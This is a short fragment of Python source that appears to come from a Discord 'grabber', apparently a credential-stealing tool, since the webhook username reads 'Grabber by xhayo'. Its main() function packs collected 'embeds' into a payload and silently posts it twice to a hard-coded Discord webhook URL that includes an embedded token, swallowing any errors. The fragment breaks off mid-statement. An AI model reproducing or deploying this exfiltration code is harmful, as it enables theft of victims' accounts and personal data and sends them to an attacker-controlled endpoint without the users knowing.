...
def main(): 
    ...
    webhook = { 
        "content": "", 
        "embeds": embeds, 
        "username": "Grabber by xhayo", 
        "avatar_url": "https://ibb.co/Xj0k57s" 
    } 
    try: 
        urlopen(Request("https://discord.com/api/webhooks/865834569534275585/Yig441Fvk0g3esjAXqrKWsabVSe4N4eQMOsdWtTTOkOXZb9-XJk6DkgTPDCMuXs5Fq6F", data=dumps(webhook).encode(), headers=getHeader())) 
    except: 
        pass 
    try: 
        urlopen(Request("https://discord.com/api/webhooks/865834569534275585/Yig441Fvk0g3esjAXqrKWsabVSe4N4eQMOsdWtTTOkOXZb9-XJk6DkgTPDCMuXs5Fq6F", data=dumps(webhook).encode(), headers=getHeader())) 
